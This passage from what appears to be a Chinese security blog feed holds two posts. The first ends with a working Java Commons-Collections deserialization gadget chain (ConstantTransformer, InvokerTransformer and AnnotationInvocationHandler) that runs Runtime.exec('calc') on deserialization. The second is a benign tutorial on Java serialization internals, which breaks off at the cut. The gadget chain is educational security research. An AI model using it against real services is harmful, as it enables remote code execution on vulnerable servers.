<p>还有一个比较重要的类<code>ConstantTransformer</code><font style="color:rgb(77, 77, 77);">，下面为</font><code>ConstantTransformer</code><font style="color:rgb(77, 77, 77);">的构造函数和transform方法，构造时传入的参数设为一个常量值，后续调用他的transform方法，无论传入什么值，都会返回这个常量，如果我们在构造时传入 Runtime.class呢</font></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">ConstantTransformer</span><span class="params">(Object constantToReturn)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>();</span><br><span class="line">        iConstant = constantToReturn;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> Object <span class="title function_">transform</span><span class="params">(Object input)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> iConstant;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>现在只需要在Transformers的首位传入ConstantTransformer类，传入参数为Runtime的类，最后就能成功执行</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        HashMap&lt;Object, Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        hashMap.put(<span class="string">&quot;value&quot;</span>, <span class="string">&quot;value&quot;</span>);</span><br><span class="line">        Map&lt;Object,Object&gt; transformedMap = TransformedMap.decorate(hashMap, <span class="literal">null</span>, chainedTransformer);</span><br><span class="line"></span><br><span class="line">        Class&lt;?&gt; aClass = Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">declaredConstructor</span> <span class="operator">=</span> aClass.getDeclaredConstructor(Class.class,Map.class);</span><br><span class="line">        declaredConstructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> declaredConstructor.newInstance(Target.class, transformedMap);</span><br><span class="line"></span><br><span class="line">        serialize(o);</span><br><span class="line">        unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1734611778517-78537c43-b8ae-4429-a561-a35934368e1b.png"></p>
<p>大概的链子如下：</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1734613113591-5088ce99-b9a6-4f9f-b7e7-f9d975d2f339.png"></p>
]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>CC链</tag>
      </tags>
  </entry>
  <entry>
    <title>Java反序列化基础</title>
    <url>/2025/02/22/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9F%BA%E7%A1%80/</url>
    <content><![CDATA[<h1 id="XwBO4">一 概述</h1>
Java序列化是指把Java对象转换为Java对象的过程。字节序列的过程；而Java反序列化是指把字节序列恢复为Java对象的过程。

<p>序列化分为两大部分：<strong>序列化和反序列化</strong>。序列化是这个过程的第一部分，将数据分解成字节流，以便存储在文件中或在网络上传输。反序列化就是打开字节流并重构对象。对象序列化不仅要将基本数据类型转换成字节表示，有时还要恢复数据。恢复数据要求有恢复数据的对象实例。</p>
<h2 id="PpXVM"><font style="color:rgb(77, 77, 77);">常见序列化反序列化协议</font></h2>
1. XML&SOAP

<p>XML 是一种常用的序列化和反序列化协议，具有跨机器，跨语言等优点，SOAP（Simple Object Access protocol） 是一种被广泛应用的，基于 XML 为序列化和反序列化协议的结构化消息传递协议</p>
<ol start="2">
<li>JSON</li>
<li>Protobuf</li>
</ol>
<h1 id="nThi2">二 序列化实现</h1>
**注意：只有实现了Serializable或者externalizable接口的类的对象才能被序列化为字节序列（否则抛出异常）**

<p>Serializable是一个空接口(所以只是用来标记)</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">Serializable</span> &#123;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><font style="color:rgb(77, 77, 77);">Serializable 用来标识当前类可以被 ObjectOutputStream 序列化，以及被 ObjectInputStream 反序列化。</font></p>
<h2 id="H09Qj"><font style="color:rgb(79, 79, 79);">Serializable 接口的基本使用</font></h2>
通过 ObjectOutputStream 将需要序列化数据写入到流中，因为 Java IO 是一种装饰者模式，因此可以通过 ObjectOutStream 包装 FileOutStream 将数据写入到文件中或者包装 ByteArrayOutStream 将数据写入到内存中。同理，可以通过 ObjectInputStream 将数据从磁盘 FileInputStream 或者内存 ByteArrayInputStream 读取出来然后转化为指定的对象即可。

<h2 id="aLPqE">Serializable接口特点</h2>
1. 序列化类属性没用实现Serialzable 那么在序列化时就回报错

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public class Person implements Serializable &#123;</span><br><span class="line">    private String name;</span><br><span class="line">    private int age;</span><br><span class="line">    </span><br><span class="line">    /*</span><br><span class="line">    其中 Color 类也需要是实现序列化接口</span><br><span class="line">     */</span><br><span class="line">    private Color color;</span><br><span class="line">    //若不实现序列化接口，则Person在序列化时也会报错</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ol start="2">
<li><font style="color:rgb(77, 77, 77);">在反序列化过程中，它的父类如果没有实现序列化接口，那么将需要提供无参构造</font>函数<font style="color:rgb(77, 77, 77);">来重新创建对象。</font></li>
</ol>
<p><font style="color:rgb(77, 77, 77);">Animal 是父类，它没有实现 Serilizable 接口</font></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Animal</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> String color;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Animal</span><span class="params">()</span> &#123;<span class="comment">//没有无参构造将会报错</span></span><br><span class="line">        System.out.println(<span class="string">&quot;调用 Animal 无参构造&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Animal</span><span class="params">(String color)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.color = color;</span><br><span class="line"> </span><br><span class="line">            System.out.println(<span class="string">&quot;调用 Animal 有 color 参数的构造&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Animal&#123;&quot;</span> +</span><br><span class="line">                <span class="string">&quot;color=&#x27;&quot;</span> + color + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&#x27;&#125;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><font style="color:rgb(77, 77, 77);">BlackCat 是 Animal 的子类</font></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">BlackCat</span> <span class="keyword">extends</span> <span class="title class_">Animal</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">long</span> <span class="variable">serialVersionUID</span> <span class="operator">=</span> <span class="number">1L</span>;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">BlackCat</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>();</span><br><span class="line">        System.out.println(<span class="string">&quot;调用黑猫的无参构造&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">BlackCat</span><span class="params">(String color, String name)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>(color);</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">        System.out.println(<span class="string">&quot;调用黑猫有 color 参数的构造&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;BlackCat&#123;&quot;</span> +</span><br><span class="line">                <span class="string">&quot;name=&#x27;&quot;</span> + name + <span class="string">&#x27;\&#x27;&#x27;</span> +<span class="built_in">super</span>.toString() +<span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&#x27;&#125;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><font style="color:rgb(77, 77, 77);">SuperMain 测试类</font></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SuperMain</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">FILE_PATH</span> <span class="operator">=</span> <span class="string">&quot;./super.bin&quot;</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        serializeAnimal();</span><br><span class="line">        deserializeAnimal();</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serializeAnimal</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">BlackCat</span> <span class="variable">black</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BlackCat</span>(<span class="string">&quot;black&quot;</span>, <span class="string">&quot;我是黑猫&quot;</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;序列化前：&quot;</span>+black.toString());</span><br><span class="line">        System.out.println(<span class="string">&quot;=================开始序列化================&quot;</span>);</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(FILE_PATH));</span><br><span class="line">        oos.writeObject(black);</span><br><span class="line">        oos.flush();</span><br><span class="line">        oos.close();</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">deserializeAnimal</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;=================开始反序列化================&quot;</span>);</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(FILE_PATH));</span><br><span class="line">        <span class="type">BlackCat</span> <span class="variable">black</span> <span class="operator">=</span> (BlackCat) ois.readObject();</span><br><span class="line">        ois.close();</span><br><span class="line">        System.out.println(black);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><font style="color:rgb(77, 77, 77);">输出结果</font></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">调用 Animal 有 color 参数的构造</span><br><span class="line">调用黑猫有 color 参数的构造</span><br><span class="line">序列化前：BlackCat&#123;name=<span class="string">&#x27;我是黑猫&#x27;</span>Animal&#123;color=<span class="string">&#x27;black&#x27;</span>&#125;<span class="string">&#x27;&#125;</span></span><br><span class="line"><span class="string">=================开始序列化================</span></span><br><span class="line"><span class="string">=================开始反序列化================</span></span><br><span class="line"><span class="string">调用 Animal 无参构造</span></span><br><span class="line"><span class="string">BlackCat&#123;name=&#x27;</span>我是黑猫<span class="string">&#x27;Animal&#123;color=&#x27;</span><span class="literal">null</span><span class="string">&#x27;&#125;&#x27;</span>&#125;</span><br></pre></td></tr></table></figure>

<p>从上面的执行结果来看，如果要序列化的对象的父类 Animal 没有实现序列化接口，那么在反序列化时是会调用对应的无参构造方法的，这样做的目的是重新初始化父类的属性，例如 Animal 因为没有实现序列化接口，因此对应的 color 属性就不会被序列化，因此反序列得到的 color 值就为 null。</p>
<ol start="3">
<li>实现Serializable接口的子类也是可以被序列化的</li>
<li>静态成员变量不能被序列化</li>
<li>transient标识的对象成员变量不参与序列化（在属性前加关键字<strong>transient</strong>，序列化时，就不会序列化到指定位置）</li>
</ol>
<h2 id="JfuOj">操作文件流的类</h2>
1. <font style="color:rgb(77, 77, 77);">ObjectOutputStream代表对象输出流：</font>

<p><font style="color:rgb(77, 77, 77);">它的writeObject(Object obj)方法可对参数指定的obj对象进行序列化，把得到的字节序列写到一个目标输出流中</font></p>
<ol start="2">
<li><font style="color:rgb(77, 77, 77);">ObjectInputStream代表对象输入流：</font></li>
</ol>
<p><font style="color:rgb(77, 77, 77);">它的readObject()方法从一个源输入流中读取字节序列，再把它们反序列化为一个对象，并将其返回。</font></p>
<h1 id="tcqIg">三 序列化ID</h1>
在进行序列化时，有一个serialVersionUID 。这就是序列化ID

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">long</span> <span class="variable">serialVersionUID</span> <span class="operator">=</span> <span class="number">1L</span>;</span><br></pre></td></tr></table></figure>

<p>这个序列化ID起着关键的作用，它决定着是否能够成功反序列化！<strong>java的序列化机制是通过判断运行时类的serialVersionUID来验证版本一致性的</strong>，在进行反序列化时，JVM会把传进来的字节流中的serialVersionUID与本地实体类中的serialVersionUID进行比较，如果相同则认为是一致的，便可以进行反序列化，否则就会报序列化版本不一致的异常。</p>
<p>即序列化ID是为了保证成功进行反序列化</p>
<h2 id="OVrGN">如何生成UID</h2>
1. <font style="color:rgb(51, 51, 51);">使用 AS plugin 插件就可以生成</font>
2. <font style="color:rgb(51, 51, 51);">在JDK中，可以利用 JDK 的 bin 目录下的 serialver 工具产生这个serialVersionUID，对于 Student.class，执行命令：serialver com.example.seriable.Student</font>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">➜  classes git:(master) ✗ /Library/Java/JavaVirtualMachines/jdk1<span class="number">.8</span><span class="number">.0_111</span>.jdk/Contents/Home/bin/serialver com.example.seriable.Student </span><br><span class="line">com.example.seriable.Student:    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">long</span> <span class="variable">serialVersionUID</span> <span class="operator">=</span> -<span class="number">6840182814363029482L</span>;<span class="comment">//这个就是工具生成的 SerialVersionUID 值了</span></span><br></pre></td></tr></table></figure>

<p><font style="color:rgb(77, 77, 77);">使用 AS plugin 的方式应该底层也是使用到这个 JDK 工具去生成的 SerialVersionUID 值，测试结果来看这两个生成的值是一样的。</font></p>
<h3 id="serialVersionUID%20%E7%9A%84%E5%85%BC%E5%AE%B9%E6%80%A7%E9%97%AE%E9%A2%98%E6%98%AF%E4%BB%80%E4%B9%88%EF%BC%9F"><font style="color:rgb(79, 79, 79);">serialVersionUID 的兼容性问题是什么？</font></h3>
<font style="color:rgb(77, 77, 77);">具体的兼容性问题如下：</font>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">java.io.InvalidClassException: com.example.seriable.Student; local <span class="keyword">class</span> <span class="title class_">incompatible</span>: stream <span class="type">classdesc</span></span><br><span class="line"><span class="variable">serialVersionUID</span> <span class="operator">=</span> -<span class="number">926212341182608815</span>, local <span class="keyword">class</span> <span class="title class_">serialVersionUID</span> = -<span class="number">6840182814363029482</span></span><br></pre></td></tr></table></figure>

<p><font style="color:rgb(77, 77, 77);">关于这个异常，它是属于兼容问题异常，是发生在反序列化阶段，检测到 serialVersionUID 不一致导致的。具体的分析如下：</font></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">序列化时使用的 serialVersionUID = -<span class="number">926212341182608815L</span>，如果期间属性被修改了，如果 serialVersionUID 发生改变 -<span class="number">6840182814363029482</span> ，那么</span><br><span class="line">反序列化时就会出现类不兼容问题。</span><br></pre></td></tr></table></figure>

<h1 id="M4sn9">四 Java的序列化步骤与数据结构分析</h1>
**序列化算法一般会按步骤做如下事情：**

<p>将对象实例相关的类元数据输出。</p>
<p>递归地输出类的超类描述直到不再有超类。</p>
<p>类元数据完了以后，开始从最顶层的超类开始输出对象实例的实际数据值。</p>
<p>从上至下递归输出实例的数据</p>
<h2 id="Q8oVq">writeObject原理分析</h2>
<h3 id="LnpPf"><font style="color:rgb(77, 77, 77);">ObjectOutputStream 构造函数</font></h3>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">ObjectOutputStream</span><span class="params">(OutputStream out)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">    verifySubclass();</span><br><span class="line">    bout = <span class="keyword">new</span> <span class="title class_">BlockDataOutputStream</span>(out);<span class="comment">//A</span></span><br><span class="line">    handles = <span class="keyword">new</span> <span class="title class_">HandleTable</span>(<span class="number">10</span>, (<span class="type">float</span>) <span class="number">3.00</span>);</span><br><span class="line">    subs = <span class="keyword">new</span> <span class="title class_">ReplaceTable</span>(<span class="number">10</span>, (<span class="type">float</span>) <span class="number">3.00</span>);</span><br><span class="line">    enableOverride = <span class="literal">false</span>;<span class="comment">//B</span></span><br><span class="line">    writeStreamHeader();<span class="comment">//C</span></span><br><span class="line">    bout.setBlockDataMode(<span class="literal">true</span>);</span><br><span class="line">    <span class="keyword">if</span> (extendedDebugInfo) &#123;</span><br><span class="line">        debugInfoStack = <span class="keyword">new</span> <span class="title class_">DebugTraceInfoStack</span>();</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        debugInfoStack = <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>A bout：用于写入一些类元数据还有对象中基本数据类型的值，在下面会分析。</p>
<p>B enableOverride ：false 表示不支持重写序列化过程，如果为 true ，那么需要重写 writeObjectOverride 方法。这个一般不用管它。</p>
<p>C writeStreamHeader() 写入头信息，具体看下面分析。</p>
<p><strong><font style="color:rgb(77, 77, 77);">ObjectOUtStream#writeObject(obj);</font></strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">writeStreamHeader</span><span class="params">()</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">    bout.writeShort(STREAM_MAGIC);<span class="comment">//①</span></span><br><span class="line">    bout.writeShort(STREAM_VERSION);<span class="comment">//②</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><font style="color:rgb(77, 77, 77);">①STREAM_MAGIC 声明使用了序列化协议，bout 就是一个流，将对应的头数据写入该流中</font></p>
<p><font style="color:rgb(77, 77, 77);">②STREAM_VERSION 指定序列化协议版本</font></p>
<p><strong><font style="color:rgb(77, 77, 77);">ObjectOUtStream#writeObject(obj);</font></strong></p>
<p><font style="color:rgb(77, 77, 77);">上面是 ObjectOutStream 构造中做的事，下面来看看具体 writeObject 方法内部做了什么事？</font></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">void</span> <span class="title function_">writeObject</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">    <span class="keyword">if</span> (enableOverride) &#123;<span class="comment">//一般不会走这里，因为在 ObjectOutputStream 构造设置为 false 了</span></span><br><span class="line">        writeObjectOverride(obj);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">try</span> &#123;<span class="comment">//代码会执行这里</span></span><br><span class="line">        writeObject0(obj, <span class="literal">false</span>);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (IOException ex) &#123;</span><br><span class="line">        ...</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong><font style="color:rgb(77, 77, 77);">ObjectOutStream#writeObject0()</font></strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">writeObject0</span><span class="params">(Object obj, <span class="type">boolean</span> unshared)</span></span><br><span class="line">    <span class="keyword">throws</span> IOException</span><br><span class="line">&#123;</span><br><span class="line">    ...</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">     </span><br><span class="line">        <span class="type">Object</span> <span class="variable">orig</span> <span class="operator">=</span> obj;</span><br><span class="line">        Class&lt;?&gt; cl = obj.getClass();</span><br><span class="line">        ObjectStreamClass desc;</span><br><span class="line">       </span><br><span class="line">        <span class="comment">//①</span></span><br><span class="line">        desc = ObjectStreamClass.lookup(cl, <span class="literal">true</span>);</span><br><span class="line">        ...</span><br><span class="line">        <span class="comment">//②</span></span><br><span class="line">        <span class="keyword">if</span> (obj <span class="keyword">instanceof</span> Class) &#123;</span><br><span class="line">            writeClass((Class) obj, unshared);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (obj <span class="keyword">instanceof</span> ObjectStreamClass) &#123;</span><br><span class="line">            writeClassDesc((ObjectStreamClass) obj, unshared);</span><br><span class="line">        <span class="comment">// END Android-changed:  Make Class and ObjectStreamClass replaceable.</span></span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (obj <span class="keyword">instanceof</span> String) &#123;</span><br><span class="line">            writeString((String) obj, unshared);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (cl.isArray()) &#123;</span><br><span class="line">            writeArray(obj, desc, unshared);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (obj <span class="keyword">instanceof</span> Enum) &#123;</span><br><span class="line">            writeEnum((Enum&lt;?&gt;) obj, desc, unshared);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (obj <span class="keyword">instanceof</span> Serializable) &#123;</span><br><span class="line">            writeOrdinaryObject(obj, desc, unshared);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        		<span class="comment">//③</span></span><br><span class="line">            <span class="keyword">if</span> (extendedDebugInfo) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">NotSerializableException</span>(</span><br><span class="line">                    cl.getName() + <span class="string">&quot;\n&quot;</span> + debugInfoStack.toString());</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">NotSerializableException</span>(cl.getName());</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; </span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><font style="color:rgb(77, 77, 77);">① lookup 函数用于查找当前类的 ObjectStreamClass ，它是用于描述一个类的结构信息的，通过它就可以获取对象及其对象属性的相关信息，并且它内部持有该对象的父类的 ObjectStreamClass 实例。</font></p>
<p><font style="color:rgb(77, 77, 77);">② 根据 obj 的类型去执行序列化操作，如果不符合序列化要求，那么会③位置抛出</font><code>NotSerializableException</code><font style="color:rgb(77, 77, 77);">异常。</font></p>
<p><strong><font style="color:rgb(77, 77, 77);">ObjectOutputStream#writeOrdinaryObject</font></strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">writeOrdinaryObject</span><span class="params">(Object obj,</span></span><br><span class="line"><span class="params">                                 ObjectStreamClass desc,</span></span><br><span class="line"><span class="params">                                 <span class="type">boolean</span> unshared)</span></span><br><span class="line">    <span class="keyword">throws</span> IOException</span><br><span class="line">&#123;</span><br><span class="line">    ...</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        desc.checkSerialize();</span><br><span class="line">        <span class="comment">//①</span></span><br><span class="line">        bout.writeByte(TC_OBJECT);</span><br><span class="line">        <span class="comment">//②</span></span><br><span class="line">        writeClassDesc(desc, <span class="literal">false</span>);</span><br><span class="line">        handles.assign(unshared ? <span class="literal">null</span> : obj);</span><br><span class="line">        <span class="comment">//③</span></span><br><span class="line">        <span class="keyword">if</span> (desc.isExternalizable() &amp;&amp; !desc.isProxy()) &#123;</span><br><span class="line">            writeExternalData((Externalizable) obj);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        		<span class="comment">//④</span></span><br><span class="line">            writeSerialData(obj, desc);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (extendedDebugInfo) &#123;</span><br><span class="line">            debugInfoStack.pop();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>①写入类的元数据，TC_OBJECT. 声明这是一个新的对象，如果写入的是一个 String 类型的数据，那么就需要 TC_STRING 这个标识。</p>
<p>②writeClassDesc 方法主要作用就是自上而下(从父类写到子类，注意只会遍历那些实现了序列化接口的类)写入描述信息。该方法内部会不断的递归调用，我们只需要关系这个方法是写入描述信息就好了。</p>
<p>从这里可以知道，序列化过程需要额外的写入很多数据，例如描述信息，类数据等，因此序列化后占用的空间肯定会更大。</p>
<p>③ desc.isExternalizable() 判断需要序列化的对象是否实现了 Externalizable 接口，这个在上面已经演示过怎么使用的，在序列化过程就是在这个地方进行判断的。如果有，那么序列化的过程就会由程序员自己控制了哦，writeExternalData 方法会回调，在这里就可以愉快地编写需要序列化的数据拉。</p>
<p>④ writeSerialData 在没有实现 Externalizable 接口时，就执行这个方法</p>
<p><strong><font style="color:rgb(77, 77, 77);">ObjectOutputstream#writeSerialData</font></strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">writeSerialData</span><span class="params">(Object obj, ObjectStreamClass desc)</span></span><br><span class="line">    <span class="keyword">throws</span> IOException</span><br><span class="line">&#123;</span><br><span class="line">		<span class="comment">//① </span></span><br><span class="line">    ObjectStreamClass.ClassDataSlot[] slots = desc.getClassDataLayout();</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; slots.length; i++) &#123;</span><br><span class="line">    </span><br><span class="line">        <span class="type">ObjectStreamClass</span> <span class="variable">slotDesc</span> <span class="operator">=</span> slots[i].desc;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (slotDesc.hasWriteObjectMethod()) &#123;<span class="comment">//②</span></span><br><span class="line">            <span class="type">PutFieldImpl</span> <span class="variable">oldPut</span> <span class="operator">=</span> curPut;</span><br><span class="line">            curPut = <span class="literal">null</span>;</span><br><span class="line">            <span class="type">SerialCallbackContext</span> <span class="variable">oldContext</span> <span class="operator">=</span> curContext;</span><br><span class="line">            <span class="keyword">if</span> (extendedDebugInfo) &#123;</span><br><span class="line">                debugInfoStack.push(</span><br><span class="line">                    <span class="string">&quot;custom writeObject data (class \&quot;&quot;</span> +</span><br><span class="line">                    slotDesc.getName() + <span class="string">&quot;\&quot;)&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                curContext = <span class="keyword">new</span> <span class="title class_">SerialCallbackContext</span>(obj, slotDesc);</span><br><span class="line">                bout.setBlockDataMode(<span class="literal">true</span>);</span><br><span class="line">                slotDesc.invokeWriteObject(obj, <span class="built_in">this</span>);</span><br><span class="line">                bout.setBlockDataMode(<span class="literal">false</span>);</span><br><span class="line">                bout.writeByte(TC_ENDBLOCKDATA);</span><br><span class="line">            &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">                curContext.setUsed();</span><br><span class="line">                curContext = oldContext;</span><br><span class="line">                <span class="keyword">if</span> 